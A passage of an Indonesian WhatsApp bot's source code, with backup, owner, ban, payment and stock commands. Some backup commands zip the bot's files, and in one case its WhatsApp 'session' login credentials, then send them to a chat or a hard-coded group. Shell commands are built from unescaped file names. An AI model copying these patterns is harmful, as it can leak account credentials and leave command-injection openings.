let jir = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await Reply('Mengumpulkan semua file ke folder...');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await Reply('Script akan dikirim lewat PC!')
const exec = await execSync(`zip -r simplepribadi.zip ${ls.join(" ")}`);
await conn.sendMessage(jir, {
document: await fs.readFileSync("./simplepribadi.zip"),
mimetype: "application/zip",
fileName: "simplebotv5.zip",
},
{quoted: m });
await execSync("rm -rf Backup.zip");
}
break

case 'backup2': {
 if (!isCreator) return Reply(`Hanya Developer !!`);
 
 // ID grup yang diatur oleh owner utama
 const groupId = '120363321313585420@g.us'; // Ganti dengan ID grup yang diinginkan

 await Reply('Mengumpulkan semua file ke folder...');
 
 const { execSync } = require("child_process");
 const fs = require("fs");

 // Menyaring file yang akan dimasukkan ke dalam zip
 const ls = (await execSync("ls")).toString().split("\n").filter((pe) =>
 pe != "node_modules" &&
 pe != "session" &&
 pe != "package-lock.json" &&
 pe != "yarn.lock" &&
 pe != ""
 );

 await Reply('Script akan dikirim ke grup yang diatur oleh owner!');

 // Membuat file zip
 const fileName = "simplepribadiv5.zip";
 await execSync(`zip -r ${fileName} ${ls.join(" ")}`);

 // Mengirimkan file zip ke grup
 try {
 await conn.sendMessage(groupId, {
 document: await fs.readFileSync(`./${fileName}`),
 mimetype: "application/zip",
 fileName: fileName,
 }, { quoted: m });

 await Reply('File berhasil dikirim ke grup!');
 } catch (error) {
 console.error("Error saat mengirim file:", error);
 await Reply('Terjadi kesalahan saat mengirim file ke grup.');
 }

 // Menghapus file zip setelah dikirim
 await execSync(`rm -rf ${fileName}`);
}
break;

case 'backup6': {
    if (!isCreator) return Reply(`Hanya Developer yang dapat menggunakan perintah ini!`);
    
    try {
        let jir = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || 
                  (args[0]?.replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
        
        await Reply('Mengumpulkan file session ke dalam folder...');
        const { execSync } = require("child_process");
        const fs = require("fs");
        
        // Cek apakah folder 'session' ada
        if (!fs.existsSync("session")) {
            return Reply('Folder "session" tidak ditemukan! Pastikan folder tersebut tersedia.');
        }

        // Membuat file zip dari folder 'session'
        execSync(`zip -r session.zip session`);
        await Reply('File session.zip akan dikirimkan...');

        // Mengirimkan file zip ke pengguna
        await conn.sendMessage(jir, {
            document: fs.readFileSync("./session.zip"),
            mimetype: "application/zip",
            fileName: "session.zip",
        }, { quoted: m });

        // Menghapus file zip setelah dikirim
        execSync("rm -rf session.zip");
        await Reply('Backup session telah berhasil dikirim.');
    } catch (error) {
        console.error(error);
        await Reply('Terjadi kesalahan saat melakukan backup session. Coba lagi nanti.');
    }
}
break;

case 'backup3': {
    if (!isCreator) return Reply(`Hanya Developer !!`);

    let jir = m.mentionedJid[0] || 
              m.sender || 
              conn.parseMention(args[0]) || 
              (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';

    await Reply('Mengumpulkan file start.js ke dalam zip...');

    const { execSync } = require("child_process");
    const fs = require("fs");

    // Membuat arsip ZIP hanya untuk start.js
    const exec = await execSync(`zip -r start_backup.zip start.js`);

    await Reply('Script akan dikirim lewat PC!');

    // Mengirim file ZIP
    await conn.sendMessage(jir, {
        document: fs.readFileSync("./start_backup.zip"),
        mimetype: "application/zip",
        fileName: "start_backup.zip",
    }, { quoted: m });

    // Hapus file zip setelah dikirim untuk menghemat penyimpanan
    await execSync("rm -rf start_backup.zip");
}
break;

case 'backup4': {
    if (!isCreator) return Reply(`Hanya Developer !!`);

    let jir = m.mentionedJid[0] || 
              m.sender || 
              conn.parseMention(args[0]) || 
              (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';

    await Reply('Mengumpulkan folder node_modules ke dalam zip...');

    const { execSync } = require("child_process");
    const fs = require("fs");

    // Periksa apakah folder node_modules ada
    if (!fs.existsSync("node_modules")) {
        return Reply("Folder node_modules tidak ditemukan!");
    }

    // Membuat arsip ZIP hanya untuk node_modules
    const exec = await execSync(`zip -r node_modules_backup.zip node_modules`);

    await Reply('Script akan dikirim lewat PC!');

    // Mengirim file ZIP
    await conn.sendMessage(jir, {
        document: fs.readFileSync("./node_modules_backup.zip"),
        mimetype: "application/zip",
        fileName: "node_modules_backup.zip",
    }, { quoted: m });

    // Hapus file zip setelah dikirim untuk menghemat penyimpanan
    await execSync("rm -rf node_modules_backup.zip");
}
break;

case 'backup5': {
    if (!isCreator) return Reply(`Hanya Developer !!`);

    let jir = m.mentionedJid[0] || 
              m.sender || 
              conn.parseMention(args[0]) || 
              (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';

    await Reply('Mengumpulkan file sikima.js ke dalam zip...');

    const { execSync } = require("child_process");
    const fs = require("fs");

    // Periksa apakah file sikima.js ada
    if (!fs.existsSync("sikima.js")) {
        return Reply("File sikima.js tidak ditemukan!");
    }

    // Membuat arsip ZIP hanya untuk sikima.js
    await execSync(`zip -r sikima_backup.zip sikima.js`);

    await Reply('Script akan dikirim lewat PC!');

    // Mengirim file ZIP
    await conn.sendMessage(jir, {
        document: fs.readFileSync("./sikima_backup.zip"),
        mimetype: "application/zip",
        fileName: "sikima_backup.zip",
    }, { quoted: m });

    // Hapus file zip setelah dikirim untuk menghemat penyimpanan
    await execSync("rm -rf sikima_backup.zip");
}
break;

case 'getsc': {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V5`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'resetdb': case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'setppbot': {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await conn.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await conn.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'clearchat': case "clc": {
if (!isCreator) return Reply(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listowner': 
case 'listown': {
    if (owners.length < 1) return m.reply("Tidak ada owner tambahan");

    let teks = `\n *乂 List All Owner Tambahan*\n`;
    teks += `──────────────────────────\n`; // Garis pemisah

    for (let i of owners) {
        teks += `\n* ${i.split("@")[0]}\n`;
        teks += `* *Tag :* @${i.split("@")[0]}\n`;
        teks += `──────────────────────────\n`; // Garis pemisah antar owner
    }

    teks += `\n *Total Owner Tambahan:* ${owners.length}\n`; // Menampilkan total owner tambahan

    conn.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delowner': case 'delown': {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅\nNomor: ${input2}☠️`)
}
break

case 'resetowner': {
    if (!isCreator) return Reply(mess.owner);

    // Pastikan database ada sebelum mencoba menghapus
    if (!Array.isArray(owners) || owners.length === 0) {
        return Reply("Tidak ada owner tambahan yang terdaftar saat ini!");
    }

    // Buat salinan baru dari daftar owner, hanya menyisakan owner utama
    let updatedOwners = owners.filter(owner => owner === global.owner);

    // Simpan perubahan ke file database
    try {
        await fs.writeFileSync("./library/database/owner.json", JSON.stringify(updatedOwners, null, 2));
        
        // Perbarui daftar owner di dalam program
        owners.length = 0; // Kosongkan array asli
        owners.push(...updatedOwners); // Tambahkan kembali owner utama
        
        Reply("Semua owner tambahan telah berhasil dihapus ✅");
    } catch (err) {
        console.error("Error saat menyimpan database:", err);
        Reply("Terjadi kesalahan saat menghapus owner ❌");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'buyown': {
if (cekSaldo(m.sender,db_saldo) < 65000) return conn.sendMessage(from, { text: `Maaf *@${m.sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp65.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}\n\n*Buy Saldo Akses ? Pm Owner !*\n*Owner:*\n*wa.me/62895373974000*\n*々 IjulTaka || 乂*`, mentions: [m.sender]}, { quoted: m })
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
Reply(`Selamat Kepada ${m.pushName} dengan nomor ${input2} telah menjadi owner✅

*KEUNTUNGAN OWNER PRIBADI👇🏻*
*1 BISA BUAT ADMIN PANEL SEPUASNYA*
*2 BISA BUAT ADMIN PANEL DI 3 SERVER*
*3 BISA ADD AKSES RESELLER 2 SERVER*

*RULES :*
*1 DILARANG KERAS MENCURI SCRIPT ( SC )!*
*2 DILARANG MENGINTIP PANEL ORG!*
*3 DILARANG BUAT PANEL TAPI GA DIPAKAI!*
*4 DILARANG ADA BOT KECUALI BOT PEMILIK ( OWNER UTAMA )*
*5 DILARANG PROMOSI!!*
*JEDA BOT MINIMAL 5 MENIT*
*6 UNLI HANYA UNTUK OWNER PANEL!*

*NOTE : JIKA MELANGGAR DIATAS KICK NO REFF!!*`)
}
minSaldo(m.sender, 65000, db_saldo)
break

case 'buyowner': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menampilkan pilihan harga
    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            { buttonId: '.buyowner_55000', buttonText: { displayText: '💎 Paket 1 Bulan Full (Rp55.000)' }, type: 1 },
            { buttonId: '.buyowner_75000', buttonText: { displayText: '🚀 Paket Permanen Full (Rp75.000)' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        text: "🛒 *Pilih Paket Owner yang Anda Inginkan:*\n\n💎 *Paket 1 Bulan Full:* Rp55.000\n🚀 *Paket Permanen Full:* Rp75.000\n\nSilakan pilih harga di bawah:",
        contextInfo: { mentionedJid: [m.sender] }
    });
}
break;

case 'buyowner_55000': 
case 'buyowner_75000': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    // Menentukan harga sesuai pilihan
    const harga = command === 'buyowner_55000' ? 55000 : 75000; 
    const paket = command === 'buyowner_55000' ? "💎 Paket 1 Bulan Full" : "🚀 Paket Permanen Full";
    const amount = harga + generateRandomNumber(110, 250); // Penyesuaian unik harga
    const UrlQr = global.qrisOrderKuota;

    // Request pembayaran ke API
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);
    
    if (!get.data.result) return m.reply("Gagal membuat pembayaran, coba lagi nanti.");
    
    const teks3 = `
    *📌 INFORMASI PEMBAYARAN*

    *• ID Transaksi:* ${get.data.result.transactionId}
    *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
    *• Paket:* ${paket}
    *• Expired:* 5 menit

    📌 *Note:* Pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis mengkonfirmasi status pembayaran kamu.
    Ketik *.batalbeli* untuk membatalkan.
    `;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: '❌ Batalkan Pembelian' }, type: 1 }],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi dalam database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        },
    };

    await db.users[m.sender].saweria.exp();

    // Loop pengecekan status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;

        if (req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await conn.sendMessage(db.users[m.sender].saweria.chat, {
                text: `✅ *PEMBAYARAN BERHASIL!*\n\n*• ID:* ${db.users[m.sender].saweria.idDeposit}\n*• Total:* Rp${await toIDR(db.users[m.sender].saweria.amount)}\n*• Paket:* ${paket}`
            }, { quoted: db.users[m.sender].saweria.msg });

            // Menambahkan pengguna sebagai Owner
            const input = m.sender;
            owners.push(input);
            await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2));

            // Kirim notifikasi owner baru
            Reply(`🎉 *Selamat!*\n${m.pushName} dengan nomor ${m.sender.split('@')[0]} telah menjadi owner ✅\n\n🔹 *Paket:* ${paket}\n\n📜 *Keuntungan Owner:*\n1. Bisa buat admin panel sepuasnya\n2. Bisa buat admin panel di 3 server\n3. Bisa tambah akses reseller di 2 server\n\n⚠️ *Rules:*\n1. Dilarang mencuri script!\n2. Dilarang mengintip panel orang!\n3. Dilarang promosi!\n\nJika melanggar, akses akan dicabut tanpa refund!`);

            await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break;
    case 'banned':
    case 'ban': {
        if (!isCreator) return Reply(mess.owner);
        if (!m.quoted && !text) return Reply("Reply pesan pengguna atau masukkan nomor untuk *dibanned*.");

        const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        if (isBanned(target)) return Reply("Pengguna sudah *dibanned* sebelumnya.");

        bannedUsers.push(target);
        saveBannedUsers();
        Reply(`✅ Pengguna *${target.split("@")[0]}* telah *dibanned*.`);
    }
    break;

    case 'unban': {
        if (!isCreator) return Reply(mess.owner);
        if (!m.quoted && !text) return Reply("Reply pesan pengguna atau masukkan nomor untuk *diunban*.");

        const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        if (!isBanned(target)) return Reply("Pengguna tidak dalam daftar banned.");

        bannedUsers = bannedUsers.filter(user => user !== target);
        saveBannedUsers();
        Reply(`✅ Pengguna *${target.split("@")[0]}* telah *diunban*.`);
    }
    break;

case 'listban': {
    if (!isCreator) return Reply(mess.owner);
    if (!Array.isArray(bannedUsers) || bannedUsers.length === 0) return m.reply("Tidak ada pengguna yang *dibanned*.");

    let list = "📜 *Daftar Pengguna yang Diblokir:*\n\n";
    let mentionedUsers = [];

    for (let i = 0; i < bannedUsers.length; i++) {
        let userId = bannedUsers[i].split("@")[0];
        list += `${i + 1}. @${userId}\n`;
        mentionedUsers.push(bannedUsers[i]);
    }

    m.reply(list, { mentions: mentionedUsers });
}
break

case 'resetban': {
    if (!isCreator) return Reply(mess.owner);
    if (!Array.isArray(bannedUsers) || bannedUsers.length === 0) 
        return Reply("Tidak ada pengguna yang dibanned.");

    let jumlahTerhapus = bannedUsers.length; // Simpan jumlah pengguna yang dibanned sebelum dihapus
    bannedUsers = []; // Menghapus semua pengguna dari daftar banned
    saveBannedUsers(); // Simpan perubahan

    Reply(`✅ Semua pengguna telah di *resetban*.\nJumlah pengguna yang di *resetban*: *${jumlahTerhapus}*`);
}
break;

case 'cek': case 'info': {
    let nomor = text.replace(/\D/g, ''); // Mengambil hanya angka dari input
    if (!nomor) return Reply("Masukkan nomor yang ingin diperiksa!");

    let isOwner = owners.includes(nomor + "@s.whatsapp.net");  
    let isPremium = premium.includes(nomor + "@s.whatsapp.net");  
    let isSeller = seller.includes(nomor + "@s.whatsapp.net");  

    let status = `🔍 *Pengecekan Nomor: ${nomor}*\n\n`;  
    status += `👑 Owner: ${isOwner ? "✅ Ya" : "❌ Tidak"}\n`;  
    status += `💎 Premium: ${isPremium ? "✅ Ya" : "❌ Tidak"}\n`;  
    status += `🛒 Seller: ${isSeller ? "✅ Ya" : "❌ Tidak"}`;  

    await conn.sendMessage(m.chat, {
        text: status,
        footer: `© 2025 ${botname}`,
        buttons: [
            { buttonId: '.buypremium', buttonText: { displayText: '💎 Buy Premium' }, type: 1 },
            { buttonId: '.buyowner', buttonText: { displayText: '🔹 Buy Owner' }, type: 1 },
            { buttonId: '.buyseller', buttonText: { displayText: '🛍 Buy Seller' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
        }
    }, { quoted: m });

}
break;

case 'ceknomor': {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply("Masukkan nomor yang ingin dicek.");

    const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!Array.isArray(bannedUsers)) bannedUsers = []; // Pastikan bannedUsers adalah array
    const isBannedUser = bannedUsers.includes(target);

    let teks, buttons;

    if (isBannedUser) {
        teks = `❌ Nomor *${text}* sudah *dibanned*.`;
        buttons = [
            { buttonId: `.owner`, buttonText: { displayText: 'Hubungi Developer' }, type: 1 }
        ];
    } else {
        teks = `✅ Nomor *${text}* belum *dibanned*.`;
        buttons = [
            { buttonId: `.owner`, buttonText: { displayText: 'Hubungi Developer' }, type: 1 }
        ];
    }

    await conn.sendMessage(m.chat, {
        buttons: buttons,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
    }, { quoted: m });
    }
    break;

case 'autosholat': {
    if (!isCreator) return Reply(mess.owner)
    if (args.length < 1) return Reply(`*Perintah Salah !!*\n*Contoh:*\n${prefix+command} on/off`);
    
    if (args[0] === 'on') {
        conn.autoshalatEnabled = true;
        Reply(`Fitur Jadwal Sholat *SUDAH AKTIF*`);
    } else if (args[0] === 'off') {
        conn.autoshalatEnabled = false;
        Reply(`Fitur Jadwal Sholat *SUDAH NONAKTIF*`);
    } else {
        Reply('Gunakan *on* atau *off* untuk mengaktifkan/mematikan fitur ini.');
    }
}
break;

case 'antispam': {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return Reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antispam = true
await Reply('Sukses mengaktifkan antispam.')
} else if (args[0] === 'off') {
global.antispam = false
await Reply('Sukses menonaktifkan antispam.')
}}
break

case 'addowner': case 'addown': {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅\nNomor: ${input2}🔥`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'addstock': {
  if (!isCreator) return m.reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return m.reply('❌ Masukkan data barang dengan format: kodebarang|namabarang|hargabarang|stockbarang');
  }

  let [kodebarang, namabarang, hargabarang, stockbarang] = input;

  // Pastikan harga dan stok adalah angka
  hargabarang = parseFloat(hargabarang);
  stockbarang = parseInt(stockbarang);

  if (isNaN(hargabarang) || isNaN(stockbarang)) {
    return m.reply('❌ Harga dan stok harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/databarang.json', 'utf8'));

    // Cek apakah kode barang sudah ada
    if (daftarBarang.some(item => item.kodebarang === kodebarang)) {
      return m.reply('❌ Kode barang sudah ada dalam daftar.');
    }

    // Tambahkan barang baru
    let barangBaru = {
      kodebarang,
      namabarang,
      hargabarang,
      stockbarang
    };

    daftarBarang.push(barangBaru);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/databarang.json', JSON.stringify(daftarBarang, null, 2));
    m.reply(`✅ Barang berhasil ditambahkan:\nKode: ${kodebarang}\nNama: ${namabarang}\nHarga: ${hargabarang}\nStok: ${stockbarang}`);
  } catch (error) {
    console.error("Error saat menambahkan barang:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan barang.');
  }
}
break;

case 'addstockdo':  
case 'addstockdigitalocean': {  
  if (!isCreator) return m.reply(mess.owner);  
  let input = text.split('|');  

  if (input.length < 5) {  
    return m.reply('❌ Masukkan data barang dengan format: kodebarang|namabarang|hargabarang|stockbarang|dropletbarang');  
  }  

  let [kodebarang, namabarang, hargabarang, stockbarang, dropletbarang] = input;  

  // Pastikan harga dan stok adalah angka  
  hargabarang = parseFloat(hargabarang);  
  stockbarang = parseInt(stockbarang);  

  if (isNaN(hargabarang) || isNaN(stockbarang)) {  
    return m.reply('❌ Harga dan stok harus berupa angka.');  
  }  

  try {  
    // Baca file JSON  
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/datado.json', 'utf8'));  

    // Cek apakah kode barang sudah ada  
    if (daftarBarang.some(item => item.kodebarang === kodebarang)) {  
      return m.reply('❌ Kode barang sudah ada dalam daftar.');  
    }  

    // Tambahkan barang baru  
    let barangBaru = {  
      kodebarang,  
      namabarang,  
      hargabarang,  
      stockbarang,  
      dropletbarang  
    };  

    daftarBarang.push(barangBaru);  

    // Simpan kembali ke file JSON  
    fs.writeFileSync('./library/database/datado.json', JSON.stringify(daftarBarang, null, 2));  
    m.reply(`✅ Barang berhasil ditambahkan:\nKode: ${kodebarang}\nNama: ${namabarang}\nHarga: ${hargabarang}\nStok: ${stockbarang}\nDroplet: ${dropletbarang}`);  
  } catch (error) {  
    console.error("Error saat menambahkan barang:", error);  
    m.reply('❌ Terjadi kesalahan saat menambahkan barang.');  
  }  
}  
break;

case 'delstockdo':  
case 'delstockdigitalocean': {  
  if (!isCreator) return m.reply(mess.owner);  

  let kodebarang = text.trim();  

  if (!kodebarang) {  
    return m.reply('❌ Masukkan kode barang yang ingin dihapus.');  
  }  

  try {  
    // Baca file JSON  
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/datado.json', 'utf8'));  

    // Cari indeks barang dengan kode yang sesuai  
    let index = daftarBarang.findIndex(item => item.kodebarang === kodebarang);  

    if (index === -1) {  
      return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');  
    }  

    // Hapus barang dari array  
    daftarBarang.splice(index, 1);  

    // Simpan kembali ke file JSON  
    fs.writeFileSync('./library/database/datado.json', JSON.stringify(daftarBarang, null, 2));  
    m.reply(`✅ Barang dengan kode ${kodebarang} berhasil dihapus.`);  
  } catch (error) {  
    console.error("Error saat menghapus barang:", error);  
    m.reply('❌ Terjadi kesalahan saat menghapus barang.');  
  }  
}  
break;

case 'checkstockdo':  
case 'checkstockdigitalocean': {  
  if (!isCreator) return m.reply(mess.owner);  

  let kodebarang = text.trim();  

  if (!kodebarang) {  
    return m.reply('❌ Masukkan kode barang yang ingin diperiksa.');  
  }  

  try {  
    // Baca file JSON  
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/datado.json', 'utf8'));  

    // Cari barang dengan kode yang sesuai  
    let barang = daftarBarang.find(item => item.kodebarang === kodebarang);  

    if (!barang) {  
      return m.reply('❌ Kode barang tidak ditemukan dalam daftar.');  
    }  

    // Kirim informasi stok barang  
    m.reply(`✅ Stok barang:\nKode: ${barang.kodebarang}\nNama: ${barang.namabarang}\nHarga: ${barang.hargabarang}\nStok: ${barang.stockbarang}\nDroplet: ${barang.dropletbarang}`);  
  } catch (error) {  
    console.error("Error saat memeriksa stok barang:", error);  
    m.reply('❌ Terjadi kesalahan saat memeriksa stok barang.');  
  }  
}  
break;

case 'checkstock': {
  if (!isCreator) return m.reply(mess.owner);
  let input = text.trim(); // Hanya mengambil kode barang tanpa pemisah '|'

  if (input.length === 0) {
    return m.reply('❌ Masukkan kode barang untuk memeriksa stok.');
  }

  let kodebarang = input;

  try {
    // Baca file JSON
    let daftarBarang = JSON.parse(fs.readFileSync('./library/database/databarang.json', 'utf8'));

    // Cari barang berdasarkan kode
    let barang = daftarBarang.find(item => item.kodebarang === kodebarang);

    if (!barang) {
      return m.reply('❌ Kode barang tidak ditemukan.');
    }

    // Tampilkan detail barang
    m.reply(`✅ Stok barang:\nKode: ${barang.kodebarang}\nNama: ${barang.namabarang}\nHarga: ${barang.hargabarang}\nStok: ${barang.stockbarang}`);
  } catch (error) {
    console.error("Error saat memeriksa stok:", error);
    m.reply('❌ Terjadi kesalahan saat memeriksa stok.');
  }
}
break;

case 'addproduk': {
  if (!isCreator) return m.reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return m.reply('❌ Masukkan data produk dengan format: kodeproduk|namaproduk|hargaproduk|deskripsiproduk');
  }

  let [kodeproduk, namaproduk, hargaproduk, deskripsiproduk] = input;

  // Pastikan harga adalah angka
  hargaproduk = parseFloat(hargaproduk);

  if (isNaN(hargaproduk)) {
    return m.reply('❌ Harga harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./library/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk sudah ada
    if (daftarProduk.some(item => item.kodeproduk === kodeproduk)) {
      return m.reply('❌ Kode produk sudah ada dalam daftar.');
    }

    // Tambahkan produk baru
    let produkBaru = {
      kodeproduk,
      namaproduk,
      hargaproduk,
      deskripsiproduk
    };

    daftarProduk.push(produkBaru);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    m.reply(`✅ Produk berhasil ditambahkan:\nKode: ${kodeproduk}\nNama: ${namaproduk}\nHarga: ${hargaproduk}\nDeskripsi: ${deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat menambahkan produk:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan produk.');
  }
}
break;

case 'checkproduk': {
  if (!isCreator) return m.reply(mess.owner);
  let input = text.trim(); // Hanya mengambil kode produk tanpa pemisah '|'

  if (input.length === 0) {
    return m.reply('❌ Masukkan kode produk untuk memeriksa produk.');
  }

  let kodeproduk = input;

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./library/database/dataproduk.json', 'utf8'));

    // Cari produk berdasarkan kode
    let produk = daftarProduk.find(item => item.kodeproduk === kodeproduk);

    if (!produk) {
      return m.reply('❌ Kode produk tidak ditemukan.');
    }

    // Tampilkan detail produk
    m.reply(`✅ Informasi produk:\nKode: ${produk.kodeproduk}\nNama: ${produk.namaproduk}\nHarga: ${produk.hargaproduk}\nDeskripsi: ${produk.deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat memeriksa produk:", error);
